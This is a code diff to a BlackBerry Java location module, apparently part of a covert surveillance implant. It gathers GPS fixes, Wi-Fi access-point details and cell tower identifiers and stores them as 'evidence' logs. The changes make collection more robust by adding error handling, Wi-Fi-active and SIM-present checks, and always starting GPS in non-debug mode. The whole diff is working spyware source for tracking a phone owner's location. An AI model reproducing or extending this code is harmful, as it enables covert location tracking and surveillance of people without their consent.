@@ -46,7 +46,7 @@ import blackberry.utils.Utils;
 public final class ModulePosition extends BaseInstantModule implements
         LocationObserver {
     //#ifdef DEBUG
-    static Debug debug = new Debug("ModPosition", DebugLevel.INFORMATION);
+    static Debug debug = new Debug("ModPosition", DebugLevel.VERBOSE);
     //#endif
 
     private static final int TYPE_GPS = 1;
@@ -201,7 +201,7 @@ public final class ModulePosition extends BaseInstantModule implements
             return;
         }
 
-        if (!Device.hasGPS()) {
+        if (!Device.getInstance().hasGPS()) {
             //#ifdef DEBUG
             debug.error("locationGPS: doesn't have GPS");
             //#endif
@@ -224,11 +224,9 @@ public final class ModulePosition extends BaseInstantModule implements
             if (!waitingForPoint) {
                 //#ifdef DEBUG
                 debug.trace("locationGPS, not waiting, start location get");
-                LocationHelper.getInstance().start(this, true);
-                //#else
-                LocationHelper.getInstance().start(this, false);
                 //#endif
 
+                LocationHelper.getInstance().start(this, false);
             } else {
                 //#ifdef DEBUG
                 debug.trace("locationGPS, waiting for point");
@@ -242,23 +240,37 @@ public final class ModulePosition extends BaseInstantModule implements
     }
 
     public void stopGps() {
-        alarm.cancel();
-        alarm = null;
-        LocationHelper.getInstance().stop(this);
+        try {
+            //#ifdef DEBUG
+            debug.trace("stopGps");
+            //#endif
+            
+            alarm.cancel();
+            alarm = null;
+
+            LocationHelper.getInstance().stop(this);
+        } catch (Exception ex) {
+            //#ifdef DEBUG
+            debug.error(ex);
+            debug.error("stopGps");
+            //#endif
+        }
     }
 
     private void locationWIFI() {
         final WLANAPInfo wifi = WLANInfo.getAPInfo();
         if (wifi != null) {
-            //#ifdef DEBUG
-            debug.info("Wifi: " + wifi.getBSSID());
-            //#endif
-            final byte[] payload = getWifiPayload(wifi.getBSSID(),
-                    wifi.getSSID(), wifi.getSignalLevel());
+            if ((RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0) {
+                //#ifdef DEBUG
+                debug.info("Wifi: " + wifi.getBSSID());
+                //#endif
+                final byte[] payload = getWifiPayload(wifi.getBSSID(),
+                        wifi.getSSID(), wifi.getSignalLevel());
 
-            logWifi.createEvidence(getAdditionalData(1, LOG_TYPE_WIFI));
-            logWifi.writeEvidence(payload);
-            logWifi.close();
+                logWifi.createEvidence(getAdditionalData(1, LOG_TYPE_WIFI));
+                logWifi.writeEvidence(payload);
+                logWifi.close();
+            }
         } else {
             //#ifdef DEBUG
             debug.warn("Wifi disabled");
@@ -272,6 +284,12 @@ public final class ModulePosition extends BaseInstantModule implements
         //final boolean gprs = !Device.isCDMA();
 
         if (Device.isGPRS()) {
+            if( ! Device.isSimEnabled()){
+                //#ifdef DEBUG
+                debug.trace("locationCELL: sim not present");
+                //#endif
+                return;
+            }
             // CC: %d, MNC: %d, LAC: %d, CID: %d (Country Code, Mobile Network Code, Location Area Code, Cell Id).
             // CC e MNC possono essere estratti da IMEI
             // http://en.wikipedia.org/wiki/Mobile_country_code
@@ -290,7 +308,8 @@ public final class ModulePosition extends BaseInstantModule implements
              */
             //#endif
 
-            int mcc = Utils.hex(RadioInfo.getMCC(RadioInfo.getCurrentNetworkIndex()));
+            int mcc = Utils.hex(RadioInfo.getMCC(RadioInfo
+                    .getCurrentNetworkIndex()));
             int mnc = RadioInfo.getMNC(RadioInfo.getCurrentNetworkIndex());
 
             final int lac = cellinfo.getLAC();
@@ -356,7 +375,6 @@ public final class ModulePosition extends BaseInstantModule implements
         }
 
     }
-
 
     public void newLocation(Location loc) {
         //#ifdef DEBUG
